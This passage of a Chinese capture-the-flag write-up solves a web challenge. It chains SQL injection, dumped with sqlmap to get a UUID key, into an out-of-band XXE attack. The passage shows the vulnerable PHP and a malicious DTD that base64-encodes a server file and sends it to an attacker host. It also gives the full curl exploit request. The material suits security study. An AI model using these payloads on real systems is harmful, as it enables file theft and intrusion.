+			<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+				<span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;output&#34;</span><span class="p">)</span>
+				<span class="nx">out</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span>
+			<span class="p">}</span>
+			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;post&#34;</span><span class="p">,</span><span class="s2">&#34;read.php&#34;</span><span class="p">)</span>
+			<span class="c1">// 
+</span><span class="c1"></span>			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;UUID&#34;</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;uuid&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">)</span>
+			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">)</span>
+			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;data=&#34;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">xml</span><span class="p">))</span>
+		<span class="p">}</span>
+	<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是这里需要有一个UUID，我们再更进看一下read.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$uuid</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_UUID&#39;</span><span class="p">];</span>
+
+<span class="k">if</span><span class="p">(</span> <span class="nv">$uuid</span> <span class="o">!=</span> <span class="s2">&#34;XXXX&#34;</span> <span class="p">){</span>
+	<span class="k">die</span><span class="p">(</span><span class="s2">&#34;UUID is not valid&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">include</span> <span class="s1">&#39;database.php&#39;</span><span class="p">;</span>
+<span class="nv">$xml</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+
+<span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
+<span class="k">try</span><span class="p">{</span>
+	<span class="o">@</span><span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$xml</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span> <span class="o">|</span> <span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
+<span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span>
+	<span class="k">echo</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$userInfo</span> <span class="o">=</span> <span class="o">@</span><span class="nx">simplexml_import_dom</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
+<span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;User Sucessfully Added.&#34;</span><span class="p">;</span>
+
+<span class="nv">$user</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="o">@</span><span class="nv">$userInfo</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">);</span>
+
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里会对uuid进行一个判断，才会进一步的加载xml，所以我们的获取到这个uuid，这里我们还有个文件没看，那就是data.php，可以看到这里的sql查询是没有增加过滤的，所以我们在这里进行一个sql注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$uname</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">];</span>
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT email FROM users where username=&#39;</span><span class="si">$uname</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="p">){</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+	<span class="nv">$email</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+	<span class="k">echo</span> <span class="nv">$email</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+	<span class="k">echo</span> <span class="s2">&#34;Erorr&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里直接用sqlmap一把嗦</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] typodb
+
+
+Database: typodb
+[3 tables]
++------------+
+| secretkeys |
+| tokens     |
+| users      |
++------------+
+
+
+
+Database: typodb
+Table: secretkeys
+[1 entry]
++--------------------------------------+
+| uuidkey                              |
++--------------------------------------+
+| 8d6ed261-f84f-4eda-b2d2-16332bd8c390 |
++--------------------------------------+
+</code></pre></td></tr></table>
+</div>
+</div><p>拿到uuid，这样我们就可以构造xxe进行攻击了，但是有个问题，这里没有回显，所以我们得在自己vps搭建个，我的payload参考<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter" target="_blank" rel="noopener noreffer">此处</a>
+</p>
+<p>vps放一个dtd.xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/var/www/flag&#34;&gt;
+&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;http://ip:port/dtd.xml?%data;&#39;&gt;&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>起一个python服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">python3 -m http.server 11111
+</code></pre></td></tr></table>
+</div>
+</div><p>curl发包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">curl -X POST https://typhooncon-typo.chals.io/read.php -H &#34;UUID: 8d6ed261-f84f-4eda-b2d2-16332bd8c390&#34; -H &#34;Cookie: PHPSESSID=ql32dudasjts4rjbsctj0vrvqd&#34; -d &#34;data=%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%20%22http%3A%2F%2F[ip]%2Fdtd%2Exml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E%0A%3Cuser%3E%3Cusername%3Eadmin%3C%2Fusername%3E%3C%2Fuser%3E&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626225143702.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626225143702.png, https://tuchuang.huamang.xyz/img/image-20220626225143702.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626225143702.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626225143702.png"
+        title="image-20220626225143702" /></p>
+<p>成功带出flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626225130183.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626225130183.png, https://tuchuang.huamang.xyz/img/image-20220626225130183.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626225130183.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626225130183.png"
+        title="image-20220626225130183" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626225226359.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626225226359.png, https://tuchuang.huamang.xyz/img/image-20220626225226359.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626225226359.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626225226359.png"
+        title="image-20220626225226359" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-06-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/ciscn2022_half/" class="prev" rel="prev" title="[CISCN2022] Semifinals"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[CISCN2022] Semifinals</a>
+            <a href="/actf2022/" class="next" rel="next" title="[ACTF2022] WP">[ACTF2022] WP<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">赣ICP备2021001334号</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
